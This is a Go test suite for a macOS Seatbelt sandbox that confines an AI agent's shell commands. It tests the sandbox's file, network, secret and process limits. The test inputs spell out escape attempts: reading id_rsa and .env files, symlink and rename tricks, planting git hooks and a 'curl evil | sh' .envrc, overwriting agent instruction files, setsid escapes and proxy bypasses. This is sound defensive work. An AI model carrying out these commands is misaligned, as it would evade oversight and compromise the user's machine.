package sandbox

import (
	"context"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

// These tests attack the sandbox the way a confused or prompt-injected model
// would: real commands, run the way Sandbox.Run runs them for the agent.

type outcome struct {
	Result
	err error
}

// denied reports whether a command was stopped: a failed call or exit.
func (o outcome) denied() bool { return o.err != nil || o.ExitCode != 0 }

type box struct {
	*Sandbox
	root string
}

func newBox(t *testing.T, c Config) box {
	t.Helper()
	root := c.Roots
	if len(root) == 0 {
		root = []string{tempDir(t)}
	}
	c.Roots = root
	s, err := New(c)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { s.Close() })
	return box{s, s.Roots()[0]}
}

// testMarker and testProtected stand in for what an application adds: its
// environment marker and the instruction files it trusts.
const testMarker = "TEST_SANDBOX"

var testProtected = []string{"AGENTS.md", ".claude", ".mcp.json"}

// seatbelt is a sandboxed box; Mode defaults to workspace-write. It marks
// commands with testMarker and protects testProtected.
func seatbelt(t *testing.T, c Config) box {
	t.Helper()
	if runtime.GOOS != "darwin" {
		t.Skip("Seatbelt is macOS only")
	}
	if c.EnvMarker == "" {
		c.EnvMarker = testMarker
	}
	if c.ProtectedNames == nil {
		c.ProtectedNames = testProtected
	}
	return newBox(t, c)
}

func (b box) sh(t *testing.T, script string) outcome {
	return b.run(t, Command{Program: "/bin/sh", Args: []string{"-c", script}})
}

func (b box) run(t *testing.T, c Command) outcome {
	t.Helper()
	if c.Cwd == "" {
		c.Cwd = b.root
	}
	if c.Timeout == 0 {
		c.Timeout = 20 * time.Second
	}
	res, err := b.Run(context.Background(), c)
	return outcome{res, err}
}

func tempDir(t *testing.T) string {
	t.Helper()
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestSeatbeltConfinesWritesToTheWorkspace(t *testing.T) {
	b := seatbelt(t, Config{})
	// Not under $TMPDIR, which commands may write by design.
	home, _ := os.UserHomeDir()
	outside, err := os.MkdirTemp(home, ".ollupi-sbx-outside-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(outside) })

	if o := b.sh(t, "echo ok > inside && cat inside"); o.denied() || o.Stdout != "ok\n" {
		t.Fatalf("write inside workspace failed: %+v", o)
	}
	if o := b.sh(t, `echo tmp > "$TMPDIR/ollupi-sbx-test" && rm "$TMPDIR/ollupi-sbx-test"`); o.denied() {
		t.Fatalf("temp dir should be writable: %+v", o)
	}
	for name, script := range map[string]string{
		"other dir":     "echo x > " + filepath.Join(outside, "escaped"),
		"home":          `echo x > "$HOME/.ollupi-sbx-escape"`,
		"symlink out":   "ln -s " + outside + " link && echo x > link/escaped",
		"absolute path": "cd / && echo x > " + filepath.Join(outside, "escaped"),
	} {
		if o := b.sh(t, script); !o.denied() {
			t.Errorf("%s: write escaped the workspace: %+v", name, o)
		}
	}
	if _, err := os.Stat(filepath.Join(outside, "escaped")); err == nil {
		t.Fatal("a file appeared outside the workspace")
	}
	if _, err := os.Stat(filepath.Join(home, ".ollupi-sbx-escape")); err == nil {
		os.Remove(filepath.Join(home, ".ollupi-sbx-escape"))
		t.Fatal("a file appeared in the home directory")
	}
}

// A turn bound to one project may write only that project, not every
// configured command directory.
func TestSeatbeltCommandRootsNarrowWrites(t *testing.T) {
	project := tempDir(t)
	// Not under $TMPDIR, which commands may write by design.
	home, _ := os.UserHomeDir()
	other, err := os.MkdirTemp(home, ".ollupi-sbx-other-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(other) })
	b := seatbelt(t, Config{Roots: []string{project, other}})
	if o := b.sh(t, "echo x > "+filepath.Join(other, "f")); o.denied() {
		t.Fatalf("configured root not writable without narrowing: %+v", o)
	}
	o := b.run(t, Command{Program: "/bin/sh", Args: []string{"-c", "echo x > " + filepath.Join(other, "f")}, Cwd: project, Roots: []string{project}})
	if !o.denied() {
		t.Fatalf("wrote outside the turn's project: %+v", o)
	}
}

// Builds and installs need their caches; the rest of home stays read-only.
func TestSeatbeltAllowsToolCachesOnly(t *testing.T) {
	home, _ := os.UserHomeDir()
	b := seatbelt(t, Config{})
	cache := filepath.Join(home, "Library", "Caches", "go-build", "ollupi-sbx-probe")
	t.Cleanup(func() { os.Remove(cache) })
	if o := b.sh(t, "echo x > '"+cache+"'"); o.denied() {
		t.Fatalf("go build cache not writable: %+v", o)
	}
	for _, path := range []string{filepath.Join(home, "Library", "Caches", "ollupi-sbx-probe"), filepath.Join(home, ".zshrc-ollupi-sbx-probe")} {
		if o := b.sh(t, "echo x > '"+path+"'"); !o.denied() {
			os.Remove(path)
			t.Errorf("%s was writable: %+v", path, o)
		}
	}
}

func TestSeatbeltReadOnlyModeBlocksAllWrites(t *testing.T) {
	home, _ := os.UserHomeDir()
	b := seatbelt(t, Config{Mode: string(ModeReadOnly)})
	if err := os.WriteFile(filepath.Join(b.root, "f"), []byte("data"), 0600); err != nil {
		t.Fatal(err)
	}
	if o := b.sh(t, "cat f"); o.denied() || o.Stdout != "data" {
		t.Fatalf("read failed: %+v", o)
	}
	for _, path := range []string{"g", filepath.Join(home, "Library", "Caches", "go-build", "ollupi-sbx-probe")} {
		if o := b.sh(t, "echo x > '"+path+"'"); !o.denied() {
			os.Remove(path)
			t.Errorf("read-only mode wrote %s: %+v", path, o)
		}
	}
}

func TestSeatbeltDenyReadHoldsInsideAWritableRoot(t *testing.T) {
	root, secrets := tempDir(t), tempDir(t)
	for _, path := range []string{filepath.Join(secrets, "id_rsa"), filepath.Join(root, "conf", ".env")} {
		if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte("SECRET"), 0600); err != nil {
			t.Fatal(err)
		}
	}
	b := seatbelt(t, Config{Roots: []string{root}, DenyRead: []string{secrets, filepath.Join(root, "conf", ".env")}})
	for name, script := range map[string]string{
		"read outside":       "cat " + filepath.Join(secrets, "id_rsa"),
		"copy outside":       "cp " + filepath.Join(secrets, "id_rsa") + " stolen",
		"read inside":        "cat conf/.env",
		"overwrite inside":   "echo x > conf/.env",
		"rename parent":      "mv conf conf2 && cat conf2/.env",
		"rename file":        "mv conf/.env conf/plain",
		"symlink to secret":  "ln -s " + filepath.Join(secrets, "id_rsa") + " s && cat s",
		"hardlink to secret": "ln conf/.env hard && cat hard",
	} {
		if o := b.sh(t, script); !o.denied() || strings.Contains(o.Stdout, "SECRET") {
			t.Errorf("%s: denied path was reachable: %+v", name, o)
		}
	}
}

func TestSeatbeltNetworkSwitch(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()
	probe := Command{Program: "/usr/bin/nc", Args: []string{"-z", "-w", "2", "127.0.0.1", strconv.Itoa(ln.Addr().(*net.TCPAddr).Port)}}
	if o := seatbelt(t, Config{Network: false}).run(t, probe); !o.denied() {
		t.Errorf("network off still connected: %+v", o)
	}
	if o := seatbelt(t, Config{Network: true}).run(t, probe); o.denied() {
		t.Errorf("network on could not connect: %+v", o)
	}
}

// The remaining tests hold with and without the sandbox; they run in
// full-access mode and, on macOS, under Seatbelt.

func eachMode(t *testing.T, c Config, test func(t *testing.T, b box)) {
	modes := []Mode{ModeFullAccess}
	if runtime.GOOS == "darwin" {
		modes = append(modes, ModeWorkspaceWrite)
	}
	for _, mode := range modes {
		t.Run(string(mode), func(t *testing.T) {
			c := c
			c.Mode = string(mode)
			test(t, newBox(t, c))
		})
	}
}

func TestHostSecretsStayOutOfTheEnvironment(t *testing.T) {
	t.Setenv("OLLUPI_TEST_API_KEY", "sk-leak")
	t.Setenv("OLLUPI_TEST_ALLOWED", "visible")
	eachMode(t, Config{EnvPassthrough: []string{"OLLUPI_TEST_ALLOWED"}}, func(t *testing.T, b box) {
		o := b.sh(t, "env")
		if o.denied() || strings.Contains(o.Stdout, "sk-leak") {
			t.Fatalf("host secret leaked into the command: %+v", o)
		}
		if !strings.Contains(o.Stdout, "OLLUPI_TEST_ALLOWED=visible") || !strings.Contains(o.Stdout, "PATH=") {
			t.Fatalf("passthrough or base variables missing: %q", o.Stdout)
		}
		if o := b.run(t, Command{Program: "/bin/sh", Args: []string{"-c", "echo $FROM_MODEL"}, Env: map[string]string{"FROM_MODEL": "set"}}); o.Stdout != "set\n" {
			t.Fatalf("explicit env not applied: %+v", o)
		}
	})
}

func TestTimeoutKillsTheWholeProcessGroup(t *testing.T) {
	eachMode(t, Config{}, func(t *testing.T, b box) {
		start := time.Now()
		o := b.run(t, Command{Program: "/bin/sh", Args: []string{"-c", "sleep 60 & echo $! > child; wait"}, Timeout: time.Second})
		if o.err == nil || !strings.Contains(o.err.Error(), "timed out") {
			t.Fatalf("want a timeout error, got %+v", o)
		}
		if d := time.Since(start); d > 10*time.Second {
			t.Fatalf("timeout took %s", d)
		}
		assertDead(t, filepath.Join(b.root, "child"))
	})
}

func TestBackgroundChildrenDieWithTheirCommand(t *testing.T) {
	eachMode(t, Config{}, func(t *testing.T, b box) {
		start := time.Now()
		if o := b.sh(t, "sleep 60 & echo $! > child; echo done"); o.denied() || o.Stdout != "done\n" {
			t.Fatalf("command failed: %+v", o)
		}
		if d := time.Since(start); d > 10*time.Second {
			t.Fatalf("a background child held the command for %s", d)
		}
		assertDead(t, filepath.Join(b.root, "child"))
	})
}

// A child that leaves the process group survives the group kill (a known
// limit of the host and Seatbelt backends) but must not hang the call.
func TestEscapedChildCannotHangTheCommand(t *testing.T) {
	if _, err := exec.LookPath("perl"); err != nil {
		t.Skip("needs perl for setsid")
	}
	eachMode(t, Config{}, func(t *testing.T, b box) {
		start := time.Now()
		o := b.sh(t, `perl -MPOSIX -e 'if (fork) { exit 0 } setsid; open F, ">", "child"; print F $$; close F; sleep 60' ; echo done`)
		if o.denied() || o.Stdout != "done\n" {
			t.Fatalf("command failed: %+v", o)
		}
		if d := time.Since(start); d > drainDelay+3*time.Second {
			t.Fatalf("escaped child held the command for %s", d)
		}
		deadline := time.Now().Add(3 * time.Second)
		for {
			raw, err := os.ReadFile(filepath.Join(b.root, "child"))
			if pid, _ := strconv.Atoi(strings.TrimSpace(string(raw))); err == nil && pid > 0 {
				_ = syscall.Kill(pid, syscall.SIGKILL)
				return
			}
			if time.Now().After(deadline) {
				t.Fatal("escaped child never wrote its pid")
			}
			time.Sleep(50 * time.Millisecond)
		}
	})
}

func assertDead(t *testing.T, pidFile string) {
	t.Helper()
	raw, err := os.ReadFile(pidFile)
	if err != nil {
		t.Fatal(err)
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(raw)))
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(3 * time.Second)
	for syscall.Kill(pid, 0) == nil {
		if time.Now().After(deadline) {
			_ = syscall.Kill(pid, syscall.SIGKILL)
			t.Fatalf("child %d outlived its command", pid)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func TestOutputFloodIsCapped(t *testing.T) {
	eachMode(t, Config{MaxOutputBytes: 4096}, func(t *testing.T, b box) {
		o := b.sh(t, "yes | head -c 5000000; echo END")
		if o.denied() || !o.Truncated {
			t.Fatalf("flood not marked truncated: exit=%d err=%v", o.ExitCode, o.err)
		}
		if len(o.Stdout) > 4096+64 || !strings.HasSuffix(o.Stdout, "END\n") {
			t.Fatalf("kept %d bytes, tail %q", len(o.Stdout), o.Stdout[max(0, len(o.Stdout)-20):])
		}
	})
}

func TestNonZeroExitIsAResult(t *testing.T) {
	eachMode(t, Config{}, func(t *testing.T, b box) {
		if o := b.sh(t, "echo out; echo err >&2; exit 3"); o.err != nil || o.ExitCode != 3 || o.Stdout != "out\n" || o.Stderr != "err\n" {
			t.Fatalf("got %+v", o)
		}
	})
}

// Git runs hooks and config-named programs the next time the user runs git
// outside the sandbox; writing them must fail, ordinary git work must not.
func TestSeatbeltProtectsGitMetadata(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("needs git")
	}
	b := seatbelt(t, Config{})
	init := exec.Command("git", "init", "-q", b.root)
	if out, err := init.CombinedOutput(); err != nil {
		t.Fatalf("git init: %v: %s", err, out)
	}
	if o := b.sh(t, "git -c user.name=t -c user.email=t@t commit -q --allow-empty -m one && git status --short"); o.denied() {
		t.Fatalf("an ordinary commit failed in the sandbox: %+v", o)
	}
	for name, script := range map[string]string{
		"hook":           "echo 'touch pwned' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit",
		"config":         "git config core.fsmonitor 'touch pwned'",
		"config append":  "echo '[core] fsmonitor = touch pwned' >> .git/config",
		"hooks rename":   "mv .git/hooks .git/hooks-old",
		"commondir":      "echo /tmp > .git/commondir",
		"replace .git":   "mv .git .git-old && mkdir .git",
		"remove .git":    "rm -rf .git",
		"nested hook":    "mkdir -p sub/.git/hooks && echo x > sub/.git/hooks/post-checkout",
		"worktree conf":  "mkdir -p .git/worktrees/w && echo x > .git/worktrees/w/config.worktree",
		"submodule hook": "mkdir -p .git/modules/m/hooks && echo x > .git/modules/m/hooks/pre-commit",
	} {
		if o := b.sh(t, script); !o.denied() {
			t.Errorf("%s: wrote git metadata: %+v", name, o)
		}
	}
	if st, err := os.Stat(filepath.Join(b.root, ".git", "config")); err != nil || !st.Mode().IsRegular() {
		t.Fatalf(".git/config is gone: %v", err)
	}
}

func TestSeatbeltReadOnlyPathsInsideARoot(t *testing.T) {
	root := tempDir(t)
	if err := os.MkdirAll(filepath.Join(root, "skills", "s"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "AGENTS.md"), []byte("be good"), 0o600); err != nil {
		t.Fatal(err)
	}
	b := seatbelt(t, Config{Roots: []string{root}, ReadOnly: []string{filepath.Join(root, "AGENTS.md"), filepath.Join(root, "skills")}})
	if o := b.sh(t, "cat AGENTS.md && echo ok > other"); o.denied() || !strings.HasPrefix(o.Stdout, "be good") {
		t.Fatalf("reading a read-only path or writing beside it failed: %+v", o)
	}
	for name, script := range map[string]string{
		"overwrite":     "echo evil > AGENTS.md",
		"new skill":     "echo evil > skills/s/SKILL.md",
		"rename":        "mv AGENTS.md gone.md",
		"rename parent": "mv skills skills-old",
	} {
		if o := b.sh(t, script); !o.denied() {
			t.Errorf("%s: changed a read-only path: %+v", name, o)
		}
	}
}

// With the network on, a Unix socket outside the allowed list stays closed:
// it could be Docker's daemon or ssh-agent.
func TestSeatbeltUnixSocketsStayClosedWithTheNetworkOn(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skip("Seatbelt is macOS only")
	}
	// Socket paths are limited to about 100 bytes; $TMPDIR is too long.
	dir, err := os.MkdirTemp("/private/tmp", "osx")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(dir) })
	sock := filepath.Join(dir, "s")
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()
	probe := Command{Program: "/bin/sh", Args: []string{"-c", "/usr/bin/nc -U '" + sock + "' < /dev/null"}}
	if o := seatbelt(t, Config{Network: true}).run(t, probe); !o.denied() {
		t.Errorf("connected to a host Unix socket: %+v", o)
	}
	if o := seatbelt(t, Config{Network: true, UnixSockets: []string{dir}}).run(t, probe); o.denied() {
		t.Errorf("an allowed socket stayed closed: %+v", o)
	}
}

// Name resolution goes through mDNSResponder's socket, which stays open.
func TestSeatbeltNetworkStillResolvesNames(t *testing.T) {
	b := seatbelt(t, Config{Network: true})
	curl := []string{"-sS", "-o", "/dev/null", "-m", "10", "https://example.com"}
	if err := exec.Command("/usr/bin/curl", curl...).Run(); err != nil {
		t.Skipf("no internet outside the sandbox either: %v", err)
	}
	if o := b.run(t, Command{Program: "/usr/bin/curl", Args: curl}); o.denied() {
		t.Errorf("curl failed in the sandbox: %+v", o)
	}
}

func TestSeatbeltLeavesPnpmsGlobalBinReadOnly(t *testing.T) {
	home, _ := os.UserHomeDir()
	b := seatbelt(t, Config{})
	probe := filepath.Join(home, "Library", "pnpm", "ollupi-sbx-probe")
	t.Cleanup(func() { os.Remove(probe) })
	if o := b.sh(t, "echo x > '"+probe+"'"); !o.denied() {
		t.Errorf("wrote into pnpm's global bin: %+v", o)
	}
}

// After the user approves leaving the sandbox, the command runs on the host.
func TestSeatbeltEscalatedCommandRunsUnsandboxed(t *testing.T) {
	b := seatbelt(t, Config{})
	home, _ := os.UserHomeDir()
	outside, err := os.MkdirTemp(home, ".ollupi-sbx-escalated-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(outside) })
	script := "echo x > " + filepath.Join(outside, "f")
	if o := b.sh(t, script); !o.denied() {
		t.Fatalf("sandboxed write escaped: %+v", o)
	}
	if o := b.run(t, Command{Program: "/bin/sh", Args: []string{"-c", script}, Unsandboxed: true}); o.denied() {
		t.Fatalf("escalated command was still sandboxed: %+v", o)
	}
}

func TestCommandRootsAreChecked(t *testing.T) {
	b := seatbelt(t, Config{})
	home, _ := os.UserHomeDir()
	if o := b.run(t, Command{Program: "/usr/bin/true", Roots: []string{home}}); o.err == nil {
		t.Fatal("ran with the home directory as a writable root")
	}
	if o := b.run(t, Command{Program: "/usr/bin/true", Roots: []string{b.root + "/../" + filepath.Base(b.root)}}); o.err == nil {
		t.Fatal("ran with a root that is not canonical")
	}
}

func TestSignalExitIsAResult(t *testing.T) {
	eachMode(t, Config{}, func(t *testing.T, b box) {
		o := b.sh(t, "echo before; kill -SEGV $$")
		if o.err != nil || o.ExitCode != 128+int(syscall.SIGSEGV) || o.Signal != "SIGSEGV" || o.Stdout != "before\n" {
			t.Fatalf("got %+v", o)
		}
	})
}

// Editors, direnv, hook managers, and agents run what these files say the
// next time you use them, outside the sandbox.
func TestSeatbeltProtectsFilesThatRunLater(t *testing.T) {
	b := seatbelt(t, Config{})
	for _, script := range []string{
		"mkdir -p .vscode && echo '{}' > .vscode/tasks.json",
		"echo 'curl evil | sh' > .envrc",
		"mkdir -p sub/.husky && echo x > sub/.husky/pre-commit",
		"echo x > .pre-commit-config.yaml",
		"echo x > AGENTS.md",
		"mkdir -p .claude && echo x > .claude/settings.json",
		"echo x > .mcp.json",
		"mkdir -p .VSCode && echo x > .VSCode/tasks.json",
		"mkdir -p .Git/hooks && echo x > .Git/hooks/pre-commit",
	} {
		if o := b.sh(t, script); !o.denied() {
			t.Errorf("%s: wrote a file that runs later: %+v", script, o)
		}
	}
	// Packages ship such files of their own; installing them must work.
	if o := b.sh(t, "mkdir -p node_modules/pkg/.vscode && echo x > node_modules/pkg/.vscode/settings.json && echo x > node_modules/pkg/AGENTS.md"); o.denied() {
		t.Errorf("a dependency folder was not writable: %+v", o)
	}
	if o := b.sh(t, "mkdir -p node_modules/pkg/.git/hooks && echo x > node_modules/pkg/.git/hooks/post-checkout"); !o.denied() {
		t.Errorf("git hooks under node_modules were writable: %+v", o)
	}
}

func TestSandboxEnvironmentIsMarked(t *testing.T) {
	o := seatbelt(t, Config{}).sh(t, `echo "$TEST_SANDBOX $TEST_SANDBOX_NETWORK_DISABLED"`)
	if o.denied() || o.Stdout != "seatbelt 1\n" {
		t.Fatalf("got %+v", o)
	}
	if o := seatbelt(t, Config{Network: true}).sh(t, `echo "$TEST_SANDBOX-$TEST_SANDBOX_NETWORK_DISABLED"`); o.Stdout != "seatbelt-\n" {
		t.Fatalf("network on: %+v", o)
	}
	if o := seatbelt(t, Config{}).run(t, Command{Program: "/bin/sh", Args: []string{"-c", `echo "[$TEST_SANDBOX]"`}, Unsandboxed: true}); o.Stdout != "[]\n" {
		t.Fatalf("unsandboxed command marked as sandboxed: %+v", o)
	}
}

// A failed command says what the sandbox stopped, from Seatbelt's log.
func TestSeatbeltReportsDenials(t *testing.T) {
	b := seatbelt(t, Config{})
	if b.denials == nil || !b.denials.running() {
		t.Skip("log stream is unavailable (it needs an administrator account)")
	}
	home, _ := os.UserHomeDir()
	target := filepath.Join(home, ".ollupi-sbx-denial-probe")
	t.Cleanup(func() { os.Remove(target) })
	// The log stream needs a moment to attach after the sandbox starts.
	time.Sleep(time.Second)
	o := b.sh(t, "echo x > '"+target+"'")
	if !o.denied() {
		t.Fatalf("write outside the workspace succeeded: %+v", o)
	}
	if !slices.ContainsFunc(o.Denials, func(d string) bool { return strings.Contains(d, "file-write") && strings.Contains(d, target) }) {
		t.Fatalf("denial not reported: %q", o.Denials)
	}
	if o := b.sh(t, "echo ok > inside"); o.denied() || len(o.Denials) != 0 {
		t.Fatalf("a clean command reported denials: %+v", o)
	}
	// Denials of a command that succeeded anyway are not reported.
	if o := b.sh(t, "echo x > '"+target+"' 2>/dev/null; true"); o.denied() || len(o.Denials) != 0 {
		t.Fatalf("a successful command reported denials: %+v", o)
	}
}

// With an allowlist, the command reaches allowed hosts through the proxy,
// and nothing else: not other hosts, not a direct connection that ignores
// the proxy variables.
func TestSeatbeltNetworkAllowlist(t *testing.T) {
	if err := exec.Command("/usr/bin/curl", "-sS", "-o", "/dev/null", "-m", "10", "https://example.com").Run(); err != nil {
		t.Skipf("no internet outside the sandbox either: %v", err)
	}
	b := seatbelt(t, Config{Network: true, Domains: DomainRules{Allowed: []string{"example.com"}}})
	if o := b.run(t, Command{Program: "/usr/bin/curl", Args: []string{"-sS", "-o", "/dev/null", "-m", "15", "https://example.com"}}); o.denied() {
		t.Fatalf("allowed host unreachable: %+v", o)
	}
	o := b.run(t, Command{Program: "/usr/bin/curl", Args: []string{"-sS", "-o", "/dev/null", "-m", "15", "https://example.org"}})
	if !o.denied() {
		t.Fatalf("a host outside the allowlist was reached: %+v", o)
	}
	if !slices.ContainsFunc(o.Denials, func(d string) bool { return strings.Contains(d, "example.org:443") }) {
		t.Errorf("blocked host not reported: %q", o.Denials)
	}
	if o := b.run(t, Command{Program: "/usr/bin/curl", Args: []string{"--noproxy", "*", "-sS", "-o", "/dev/null", "-m", "10", "https://example.com"}}); !o.denied() {
		t.Fatalf("a direct connection bypassed the proxy: %+v", o)
	}
	if o := b.run(t, Command{Program: "/usr/bin/curl", Args: []string{"-sS", "-o", "/dev/null", "-m", "10", "--socks5-hostname", "127.0.0.1:1", "https://example.com"}}); !o.denied() {
		t.Fatalf("another local port was reachable: %+v", o)
	}
}

// socketpair needs a Unix socket but no path; it works with the network off.
func TestSeatbeltAllowsSocketpair(t *testing.T) {
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("needs python3")
	}
	o := seatbelt(t, Config{}).run(t, Command{Program: "/usr/bin/python3", Args: []string{"-c", "import socket; a, b = socket.socketpair(); a.send(b'ok'); print(b.recv(2).decode())"}})
	if o.denied() || o.Stdout != "ok\n" {
		t.Fatalf("socketpair failed: %+v", o)
	}
}
